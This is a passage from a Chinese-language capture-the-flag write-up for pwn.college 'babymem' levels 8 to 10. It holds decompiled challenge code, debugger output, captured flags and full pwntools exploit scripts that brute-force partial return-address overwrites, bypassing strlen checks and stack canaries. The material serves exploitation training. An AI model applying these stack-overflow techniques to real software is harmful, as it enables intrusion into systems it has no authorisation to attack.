            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main loop: {e}")
```

## Flag

Flag: `pwn.college{EC4bj1hO9Oo1kCMvjnoAdmOg2ed.0lMwMDL5cTNxgzW}`

# Level 8.0

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary with an additional check on your input.

## Write-up

```c {8, 24} ins={118-120} del={112, 116, 125} collapse={1-4, 12-20, 28-108, 129-156}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int *v3; // rax
  char *v4; // rax
  _QWORD v6[3]; // [rsp+0h] [rbp-80h] BYREF
  int v7; // [rsp+1Ch] [rbp-64h]
  size_t size; // [rsp+28h] [rbp-58h] BYREF
  _QWORD v9[4]; // [rsp+30h] [rbp-50h] BYREF
  int v10; // [rsp+50h] [rbp-30h]
  char v11; // [rsp+54h] [rbp-2Ch]
  size_t v12; // [rsp+60h] [rbp-20h]
  int v13; // [rsp+6Ch] [rbp-14h]
  void *buf; // [rsp+70h] [rbp-10h]
  void *dest; // [rsp+78h] [rbp-8h]
  __int64 savedregs; // [rsp+80h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+88h] [rbp+8h] BYREF

  v7 = a1;
  v6[2] = a2;
  v6[1] = a3;
  memset(v9, 0, sizeof(v9));
  v10 = 0;
  v11 = 0;
  dest = v9;
  size = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v6;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", dest);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 37);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is no \"win\" variable.");
  puts("You will need to force the program to execute the win_authed() function");
  puts("by directly overflowing into the stored return address back to main,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_DWORD)dest);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_DWORD)dest + 8,
    37);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)dest - 37);
  puts("and 8 that will overwrite the return address).\n");
  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
  puts("- the canary is disabled, otherwise you would corrupt it before");
  puts("overwriting the return address, and the program would abort.");
  puts("Because the binary is position independent, you cannot know");
  puts("exactly where the win_authed() function is located.");
  puts("This means that it is not clear what should be written into the return address.\n");
  printf("Payload size: ");
  __isoc99_scanf("%lu", &size);
  printf("You have chosen to send %lu bytes of input!\n", size);
  printf("This will allow you to write from %p (the start of the input buffer)\n", dest);
  printf(
    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
    (char *)dest + size,
    size - 37);
  printf("Of these, you will overwrite %d bytes into the return address.\n", size + (_DWORD)dest - rp_);
  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
  puts("Overwriting the entire return address is fine when we know");
  puts("the whole address, but here, we only really know the last three nibbles.");
  puts("These nibbles never change, because pages are aligned to 0x1000.");
  puts("This gives us a workaround: we can overwrite the least significant byte");
  puts("of the saved return address, which we can know from debugging the binary,");
  puts("to retarget the return to main to any instruction that shares the other 7 bytes.");
  puts("Since that last byte will be constant between executions (due to page alignment),");
  puts("this will always work.");
  puts("If the address we want to redirect execution to is a bit farther away from");
  puts("the saved return address, and we need to write two bytes, then one of those");
  puts("nibbles (the fourth least-significant one) will be a guess, and it will be");
  puts("incorrect 15 of 16 times.");
  puts("This is okay: we can just run our exploit a few times until it works");
  puts("(statistically, ~50% chance after 11 times and ~90% chance after 36 times).");
  puts("One caveat in this challenge is that the win_authed() function must first auth:");
  puts("it only lets you win if you provide it with the argument 0x1337.");
  puts("Speifically, the win_authed() function looks something like:");
  puts("    void win_authed(int token)");
  puts("    {");
  puts("      if (token != 0x1337) return;");
  puts("      puts(\"You win! Here is your flag: \");");
  puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
  puts("      puts(\"\");");
  puts("    }");
  puts(byte_3F3B);
  puts("So how do you pass the check? There *is* a way, and we will cover it later,");
  puts("but for now, we will simply bypass it! You can overwrite the return address");
  puts("with *any* value (as long as it points to executable code), not just the start");
  puts("of functions. Let's overwrite past the token check in win!\n");
  puts("To do this, we will need to analyze the program with objdump, identify where");
  puts("the check is in the win_authed() function, find the address right after the check,");
  puts("and write that address over the saved return address.\n");
  puts("Go ahead and find this address now. When you're ready, input a buffer overflow");
  printf(
    "that will overwrite the saved return address (at %p, %d bytes into the buffer)\n",
    (const void *)rp_,
    rp_ - (_DWORD)dest);
  puts("with the correct value.\n");
  puts("This challenge is careful about reading your input: it will allocate a correctly-sized temporary");
  puts("buffer on the heap, and then copy the data over to the stack. Can you figure out a way to fool");
  puts("this technique and cause an overflow?");
  buf = malloc(size);
  if ( !buf )
    __assert_fail("tmp_input != 0", "/challenge/babymem-level-8-0.c", 0xC0u, "challenge");
  printf("Send your payload (up to %lu bytes)!\n", size);
  v13 = read(0, buf, size);
  puts("Checking length of received string...");
  v12 = strlen((const char *)buf);
  if ( v12 > 0x24 )
    __assert_fail("string_length < 37", "/challenge/babymem-level-8-0.c", 0xC5u, "challenge");
  printf(
    "Passed! We should have enough space for all %d bytes of it on the stack. Copying all %d received bytes!\n",
    v12,
    v13);
  memcpy(dest, buf, v13);
  if ( v13 < 0 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("ERROR: Failed to read input -- %s!\n", v4);
    exit(1);
  }
  printf("You sent %d bytes!\n", v13);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", dest);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the address of win_authed() is %p.\n", win_authed);
  putchar(10);
  puts("If you have managed to overwrite the return address with the correct value,");
  puts("challenge() will jump straight to win_authed() when it returns.");
  printf("Let's try it now!\n\n");
  if ( (unsigned __int64)dest + v13 > rp_ + 2 )
  {
    puts("WARNING: You sent in too much data, and overwrote more than two bytes of the address.");
    puts("         This can still work, because I told you the correct address to use for");
    puts("         this execution, but you should not rely on that information.");
    puts("         You can solve this challenge by only overwriting two bytes!");
    puts("         ");
  }
  puts("Goodbye!");
  return 0LL;
}
```

我们知道 `memcpy` 会把我们输入的数据从 `buf` 复制到 `dest`，具体复制多少是根据 `v13`，也就是 `read` 到的大小决定的，那这就存在了缓冲出溢出问题了。所以思路是我们利用 `memcpy` 覆盖返回地址控制执行流。

内存我们正常分配就好，这里主要是得设法绕过 `v12 > 0x24`，也就是 payload 不能大于 36 bytes，很显然这是不现实的，覆盖返回段地址至少要 0x58 bytes。

注意到判断输入长度的函数是 `strlen`。这个函数根据 Null 字符 `\x00` 判断字符串是否结束。那么，如果我们在 payload 一开始就写一个 Null 字符，`strlen` 就会认为字符串长度为零，成功绕过判断。

```asm wrap=false showLineNumbers=false {23} collapse={1-19, 27-52}
Breakpoint 1, 0x000055555555622f in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  0x7fffffffd160 ◂— 0
 RBX  0x7fffffffe308 —▸ 0x7fffffffe6ba ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-8-0'
 RCX  0x55555555b2a0 ◂— 0xa /* '\n' */
 RDX  1
 RDI  0x7fffffffd160 ◂— 0
 RSI  0x55555555b2a0 ◂— 0xa /* '\n' */
 R8   0x64
 R9   0xffffffff
 R10  0
 R11  0x202
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0
 RBP  0x7fffffffd1b0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
 RSP  0x7fffffffd130 —▸ 0x7fffffffd160 ◂— 0
 RIP  0x55555555622f (challenge+1522) ◂— call 0x5555555551d0
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x55555555622f <challenge+1522>    call   memcpy@plt                  <memcpy@plt>
        dest: 0x7fffffffd160 ◂— 0
        src: 0x55555555b2a0 ◂— 0xa /* '\n' */
        n: 1

   0x555555556234 <challenge+1527>    cmp    dword ptr [rbp - 0x14], 0
   0x555555556238 <challenge+1531>    jns    challenge+1577              <challenge+1577>

   0x55555555623a <challenge+1533>    call   __errno_location@plt        <__errno_location@plt>

   0x55555555623f <challenge+1538>    mov    eax, dword ptr [rax]
   0x555555556241 <challenge+1540>    mov    edi, eax
   0x555555556243 <challenge+1542>    call   strerror@plt                <strerror@plt>

   0x555555556248 <challenge+1547>    mov    rsi, rax
   0x55555555624b <challenge+1550>    lea    rdi, [rip + 0x21b6]     RDI => 0x555555558408 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x555555556252 <challenge+1557>    mov    eax, 0                  EAX => 0
   0x555555556257 <challenge+1562>    call   printf@plt                  <printf@plt>
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fffffffd130 —▸ 0x7fffffffd160 ◂— 0
01:0008│-078     0x7fffffffd138 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f0 ◂— 'SHELL=/usr/bin/zsh'
02:0010│-070     0x7fffffffd140 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6ba ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-8-0'
03:0018│-068     0x7fffffffd148 ◂— 0x1f7e3070b
04:0020│-060     0x7fffffffd150 —▸ 0x555555558770 ◂— 0x2023232300232323 /* '###' */
05:0028│-058     0x7fffffffd158 ◂— 0x6eb
06:0030│ rax rdi 0x7fffffffd160 ◂— 0
07:0038│-048     0x7fffffffd168 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x55555555622f challenge+1522
   1   0x55555555649b main+198
   2   0x7ffff7dcae08
   3   0x7ffff7dcaecc __libc_start_main+140
   4   0x55555555526e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> i frame
Stack level 0, frame at 0x7fffffffd1c0:
 rip = 0x55555555622f in challenge; saved rip = 0x55555555649b
 called by frame at 0x7fffffffe1f0
 Arglist at 0x7fffffffd1b0, args:
 Locals at 0x7fffffffd1b0, Previous frame's sp is 0x7fffffffd1c0
 Saved registers:
  rbp at 0x7fffffffd1b0, rip at 0x7fffffffd1b8
pwndbg> dist 0x7fffffffd160 0x7fffffffd1b8
0x7fffffffd160->0x7fffffffd1b8 is 0x58 bytes (0xb words)
pwndbg>
```

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, log, pause, process, random, remote, gdb

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-8-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
b *challenge+1421
b *challenge+1502
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


null = b"\x00"
padding = b"".ljust(0x58 - 0x1, b"A")
fixed_offset = b"\x3c"
possible_bytes = [bytes([i]) for i in range(0x0B, 0x10B, 0x10)]


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()
        target.recvuntil(b"Payload size: ")
        target.sendline(payload_size)
        target.recvuntil(b"Send your payload")
        target.send(payload)

        response = target.recvall()

        return b"You win!" in response
    except Exception as e:
        log.exception(f"An error occurred: {e}")


while True:
    try:
        target = launch(debug=False)

        payload = null + padding
        payload += fixed_offset + random.choice(possible_bytes)
        log.info(f"Trying payload: {payload.hex()}")

        if send_payload(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main loop: {e}")
```

## Flag

Flag: `pwn.college{82SpQ2oiZjETn254hnZR69O97tP.01MwMDL5cTNxgzW}`

# Level 8.1

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary with an additional check on your input.

## Write-up

不多说，参考上一题。

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, log, pause, process, random, remote, gdb

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-8-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
b *challenge+259
b *challenge+326
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


null = b"\x00"
padding = b"".ljust(0x68 - 0x1, b"A")
fixed_offset = b"\x5a"
possible_bytes = [bytes([i]) for i in range(0x0F, 0x10F, 0x10)]


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()
        target.recvuntil(b"Payload size: ")
        target.sendline(payload_size)
        target.recvuntil(b"Send your payload")
        target.send(payload)

        response = target.recvall()

        return b"You win!" in response
    except Exception as e:
        log.exception(f"An error occurred: {e}")


while True:
    try:
        target = launch(debug=False)

        payload = null + padding
        payload += fixed_offset + random.choice(possible_bytes)
        log.info(f"Trying payload: {payload.hex()}")

        if send_payload(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main loop: {e}")
```

## Flag

Flag: `pwn.college{orn4FN_Dc8Po8bG2OX-G3dcj8Pr.0FNwMDL5cTNxgzW}`

# Level 9.0

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time in a PIE binary with a stack canary. Be warned, this requires careful and clever payload construction!

## Write-up

```c {12-13, 23-25, 89} del={134-139} collapse={1-8, 17-19, 29-85, 93-130, 143-174}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int v3; // eax
  int *v4; // rax
  char *v5; // rax
  _QWORD v7[3]; // [rsp+0h] [rbp-80h] BYREF
  int v8; // [rsp+1Ch] [rbp-64h]
  int v9; // [rsp+24h] [rbp-5Ch]
  unsigned __int64 v10; // [rsp+28h] [rbp-58h] BYREF
  char *v11; // [rsp+30h] [rbp-50h]
  int *v12; // [rsp+38h] [rbp-48h]
  _QWORD v13[6]; // [rsp+40h] [rbp-40h] BYREF
  int v14; // [rsp+70h] [rbp-10h] BYREF
  unsigned __int64 v15; // [rsp+78h] [rbp-8h]
  __int64 savedregs; // [rsp+80h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+88h] [rbp+8h] BYREF

  v8 = a1;
  v7[2] = a2;
  v7[1] = a3;
  v15 = __readfsqword(0x28u);
  memset(v13, 0, sizeof(v13));
  v14 = 0;
  v11 = (char *)v13;
  v12 = &v14;
  v10 = 0LL;
  puts("The challenge() function has just been launched!");
  sp_ = (__int64)v7;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v7) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
  DUMP_STACK(sp_, sz_);
  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
  puts("including the saved base pointer and the saved return address, for a");
  printf("total of %d bytes.\n", 8 * sz_);
  printf("The input buffer begins at %p, partway through the stack frame,\n", v11);
  puts("(\"above\" it in the stack are other local variables used by the function).");
  puts("Your input will be read into this buffer.");
  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 48);
  puts("large input length, and thus overflow the buffer.\n");
  puts("In this level, there is no \"win\" variable.");
  puts("You will need to force the program to execute the win_authed() function");
  puts("by directly overflowing into the stored return address back to main,");
  printf(
    "which is stored at %p, %d bytes after the start of your input buffer.\n",
    (const void *)rp_,
    rp_ - (_DWORD)v11);
  printf(
    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
    rp_ - (_DWORD)v11 + 8,
    48);
  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)v11 - 48);
  puts("and 8 that will overwrite the return address).\n");
  cp_ = bp_;
  cv_ = __readfsqword(0x28u);
  while ( *(_QWORD *)cp_ != cv_ )
    cp_ -= 8LL;
  puts("While canaries are enabled, this program reads your input 1 byte at a time,");
  puts("tracking how many bytes have been read and the offset from your input buffer");
  puts("to read the byte to using a local variable on the stack.");
  puts("The code for doing this looks something like:");
  puts("    while (n < size) {");
  puts("      n += read(0, input + n, 1);");
  puts("    }");
  puts("As it turns out, you can use this local variable `n` to jump over the canary.");
  printf("Your input buffer is stored at %p, and this local variable `n`\n", v11);
  printf("is stored %d bytes after it at %p.\n\n", (_DWORD)v12 - (_DWORD)v11, v12);
  puts("When you overwrite `n`, you will change the program's understanding of");
  puts("how many bytes it has read in so far, and when it runs `read(0, input + n, 1)`");
  puts("again, it will read into an offset that you control.");
  puts("This will allow you to reposition the write *after* the canary, and write");
  puts("into the return address!\n");
  puts("The payload size is deceptively simple.");
  puts("You don't have to think about how many bytes you will end up skipping:");
  puts("with the while loop described above, the payload size marks the");
  puts("*right-most* byte that will be read into.");
  puts("As far as this challenge is concerned, there is no difference between bytes");
  puts("\"skipped\" by fiddling with `n` and bytes read in normally: the values");
  puts("of `n` and `size` are all that matters to determine when to stop reading,");
  puts("*not* the number of bytes actually read in.\n");
  puts("That being said, you *do* need to be careful on the sending side: don't send");
  puts("the bytes that you're effectively skipping!\n");
  puts("Because the binary is position independent, you cannot know");
  puts("exactly where the win_authed() function is located.");
  puts("This means that it is not clear what should be written into the return address.\n");
  printf("Payload size: ");
  __isoc99_scanf("%lu", &v10);
  printf("You have chosen to send %lu bytes of input!\n", v10);
  printf("This will allow you to write from %p (the start of the input buffer)\n", v11);
  printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", &v11[v10], v10 - 48);
  printf("Of these, you will overwrite %d bytes into the return address.\n", v10 + (_DWORD)v11 - rp_);
  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
  puts("Overwriting the entire return address is fine when we know");
  puts("the whole address, but here, we only really know the last three nibbles.");
  puts("These nibbles never change, because pages are aligned to 0x1000.");
  puts("This gives us a workaround: we can overwrite the least significant byte");
  puts("of the saved return address, which we can know from debugging the binary,");
  puts("to retarget the return to main to any instruction that shares the other 7 bytes.");
  puts("Since that last byte will be constant between executions (due to page alignment),");
  puts("this will always work.");
  puts("If the address we want to redirect execution to is a bit farther away from");
  puts("the saved return address, and we need to write two bytes, then one of those");
  puts("nibbles (the fourth least-significant one) will be a guess, and it will be");
  puts("incorrect 15 of 16 times.");
  puts("This is okay: we can just run our exploit a few times until it works");
  puts("(statistically, ~50% chance after 11 times and ~90% chance after 36 times).");
  puts("One caveat in this challenge is that the win_authed() function must first auth:");
  puts("it only lets you win if you provide it with the argument 0x1337.");
  puts("Speifically, the win_authed() function looks something like:");
  puts("    void win_authed(int token)");
  puts("    {");
  puts("      if (token != 0x1337) return;");
  puts("      puts(\"You win! Here is your flag: \");");
  puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
  puts("      puts(\"\");");
  puts("    }");
  puts(byte_440D);
  puts("So how do you pass the check? There *is* a way, and we will cover it later,");
  puts("but for now, we will simply bypass it! You can overwrite the return address");
  puts("with *any* value (as long as it points to executable code), not just the start");
  puts("of functions. Let's overwrite past the token check in win!\n");
  puts("To do this, we will need to analyze the program with objdump, identify where");
  puts("the check is in the win_authed() function, find the address right after the check,");
  puts("and write that address over the saved return address.\n");
  puts("Go ahead and find this address now. When you're ready, input a buffer overflow");
  printf(
    "that will overwrite the saved return address (at %p, %d bytes into the buffer)\n",
    (const void *)rp_,
    rp_ - (_DWORD)v11);
  puts("with the correct value.\n");
  printf("Send your payload (up to %lu bytes)!\n", v10);
  while ( *v12 < v10 )
  {
    printf("About to read 1 byte to %p, this is %d bytes away from the start of the input buffer.\n", &v11[*v12], *v12);
    v3 = read(0, &v11[*v12], 1uLL);
    *v12 += v3;
  }
  v9 = *v12;
  if ( v9 < 0 )
  {
    v4 = __errno_location();
    v5 = strerror(*v4);
    printf("ERROR: Failed to read input -- %s!\n", v5);
    exit(1);
  }
  printf("You sent %d bytes!\n", v9);
  puts("Let's see what happened with the stack:\n");
  DUMP_STACK(sp_, sz_);
  puts("The program's memory status:");
  printf("- the input buffer starts at %p\n", v11);
  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
  printf("- the canary is stored at %p.\n", (const void *)cp_);
  printf("- the canary value is now %p.\n", *(const void **)cp_);
  printf("- the address of the number of bytes read counter and read offset is %p.\n", v12);
  printf("- the address of win_authed() is %p.\n", win_authed);
  putchar(10);
  puts("If you have managed to overwrite the return address with the correct value,");
  puts("challenge() will jump straight to win_authed() when it returns.");
  printf("Let's try it now!\n\n");
  if ( (unsigned __int64)&v11[v9] > rp_ + 2 )
  {
    puts("WARNING: You sent in too much data, and overwrote more than two bytes of the address.");
    puts("         This can still work, because I told you the correct address to use for");
    puts("         this execution, but you should not rely on that information.");
    puts("         You can solve this challenge by only overwriting two bytes!");
    puts("         ");
  }
  puts("Goodbye!");
  return 0LL;
}
```

这题的漏洞在于没有对数组索引做是否超出数组容量的判断，导致可以通过数组越界在任意内存处写入数据。

```c
while ( *v12 < v10 )
{
  printf("About to read 1 byte to %p, this is %d bytes away from the start of the input buffer.\n", &v11[*v12], *v12);
  v3 = read(0, &v11[*v12], 1uLL);
  *v12 += v3;
}
```

我们知道 `v10` 是我们提供的任意大小。程序内部通过一个 `while` 循环从零开始向 `v13` 数组读入数据，一次一字节，每次写完后将 `*v12` 加上本次读入字节数，也就是加一，以此指向下一个内存单元。这个过程一共写 `v10` 次。

由于读入数据的实现是 `read(0, &v11[*v12], 1uLL)`，这会将一个字节读到 `&v11[*v12]` 这个地址。`*v12` 是从零开始的索引，`v11` 保存的是输入缓冲区的起始地址。

如果我们将输入缓冲区填满，再多写入一个字节就会覆盖索引 `*v12` 的值。如果我们把索引设为我们想写入的位置，就实现了任意位置写。因此这里我们只需要计算要覆盖的返回地址和输入缓冲区起始位置之间的距离即可，用这个距离覆盖索引值来修改返回地址。

不过根据程序逻辑，我们是先判断 `*v12 < v10` 是否成立，成立则读入一个字节到 `&v11[*v12]`，然后将 `*v12` 加一，回到判断，如果还是小于 `v10` 就再读入一个字节到指定位置。因此我们计算出输入缓冲区起始位置到返回地址之间的距离后应该将其减一，用这个值来覆盖索引值，这样才能做到下一次读入的位置是我们想覆盖的目标地址。

这个程序是开启了 Canary 和 PIE 保护的，不过因为数组越界写的漏洞存在，我们可以直接跳过 Canary 覆盖返回地址。因为有 PIE，而我们通过页偏移的方式定位要执行的指令，所以我们最后只需要两个字节来覆盖返回地址。这里需要注意的是，payload 结构是用来填充数组的 padding + 用来重定位写入索引的一字节 + 用来重定位执行流的两字节页偏移。如果我们将这个 payload 大小作为 `v10` 的话，得到的可输入大小是数组大小加三，但是我们的返回地址肯定在一个比较高的位置，导致 `*v12 < v10` 这条检测失败，不会去覆盖返回地址。所以为了绕过这个判断，我们实际需要的输入大小应该是用来重定位写入的索引的值加三，那这不够的大小就需要我们通过在 payload 末尾再加一段 padding 实现。当然你也可以手动指定最大输入大小就是了…

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, log, pause, process, random, remote, gdb

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-9-0"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
b *challenge+1786
b *challenge+1816
b *challenge+1825
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


destination = b"\x47"
fixed_offset = b"\x84"
possible_bytes = [bytes([i]) for i in range(0x06, 0x106, 0x10)]
padding = b"".ljust(0x30, b"A") + destination
extra_padding = b"".ljust(0x17, b"A")


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()
        target.recvuntil(b"Payload size: ")
        target.sendline(payload_size)
        target.recvuntil(b"Send your payload")
        target.send(payload)

        response = target.recvall()
        # pause()

        return b"You win!" in response
    except Exception as e:
        log.exception(f"An error occurred: {e}")


while True:
    try:
        target = launch(debug=False)

        payload = padding
        payload += fixed_offset + random.choice(possible_bytes)
        payload += extra_padding
        log.info(f"Trying payload: {payload.hex()}")

        if send_payload(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main loop: {e}")
```

## Flag

Flag: `pwn.college{QccZPJ6VBhlEFtdfJdexxhwYSnh.0VNwMDL5cTNxgzW}`

# Level 9.1

## Information

- Category: Pwn

## Description

> Overflow a buffer and smash the stack to obtain the flag, but this time in a PIE binary with a stack canary. Be warned, this requires careful and clever payload construction!

## Write-up

```c del={22-26} collapse={1-18, 30-36}
__int64 challenge()
{
  int v0; // eax
  int *v1; // rax
  char *v2; // rax
  unsigned __int64 v4; // [rsp+28h] [rbp-88h] BYREF
  _BYTE *v5; // [rsp+30h] [rbp-80h]
  int *v6; // [rsp+38h] [rbp-78h]
  _BYTE v7[96]; // [rsp+40h] [rbp-70h] BYREF
  int v8; // [rsp+A0h] [rbp-10h] BYREF
  unsigned __int64 v9; // [rsp+A8h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  memset(v7, 0, sizeof(v7));
  v8 = 0;
  v5 = v7;
  v6 = &v8;
  v4 = 0LL;
  printf("Payload size: ");
  __isoc99_scanf("%lu", &v4);
  printf("Send your payload (up to %lu bytes)!\n", v4);
  while ( *v6 < v4 )
  {
    v0 = read(0, &v5[*v6], 1uLL);
    *v6 += v0;
  }
  if ( *v6 < 0 )
  {
    v1 = __errno_location();
    v2 = strerror(*v1);
    printf("ERROR: Failed to read input -- %s!\n", v2);
    exit(1);
  }
  puts("Goodbye!");
  return 0LL;
}
```

同上一题一样，自己琢磨去吧……

## Exploit

```python
#!/usr/bin/python3

from pwn import context, ELF, log, pause, process, random, remote, gdb

context(log_level="debug", terminal="kitty")

FILE = "./babymem-level-9-1"
HOST = "pwn.college"
PORT = 1337

gdbscript = """
b *challenge+212
b *challenge+233
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


destination = b"\x77"
fixed_offset = b"\xe4"
possible_bytes = [bytes([i]) for i in range(0x0F, 0x10F, 0x10)]
padding = b"".ljust(0x60, b"A") + destination
extra_padding = b"".ljust(0x17, b"A")


def send_payload(target, payload):
    try:
        payload_size = f"{len(payload)}".encode()
        target.recvuntil(b"Payload size: ")
        target.sendline(payload_size)
        target.recvuntil(b"Send your payload")
        target.send(payload)

        response = target.recvall()
        # pause()

        return b"You win!" in response
    except Exception as e:
        log.exception(f"An error occurred: {e}")


while True:
    try:
        target = launch(debug=False)

        payload = padding
        payload += fixed_offset + random.choice(possible_bytes)
        payload += extra_padding
        log.info(f"Trying payload: {payload.hex()}")

        if send_payload(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main loop: {e}")
```

## Flag

Flag: `pwn.college{QfzSsyMdYf7_dP64EnXQ8DrrgQ1.0lNwMDL5cTNxgzW}`

# Level 10.0

## Information

- Category: Pwn

## Description

> Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!

## Write-up

```c {10-12, 26-27} ins={47-48} del={62, 80} collapse={1-6, 16-22, 31-43, 52-58, 66-76}
__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  int v3; // eax
  int *v4; // rax
  char *v5; // rax
  _QWORD v7[3]; // [rsp+0h] [rbp-170h] BYREF
  int v8; // [rsp+1Ch] [rbp-154h]
  int v9; // [rsp+24h] [rbp-14Ch]
  size_t nbytes; // [rsp+28h] [rbp-148h] BYREF
  void *v11; // [rsp+30h] [rbp-140h]
  void *buf; // [rsp+38h] [rbp-138h]
  _BYTE v13[288]; // [rsp+40h] [rbp-130h] BYREF
  int v14; // [rsp+160h] [rbp-10h]
  char v15; // [rsp+164h] [rbp-Ch]
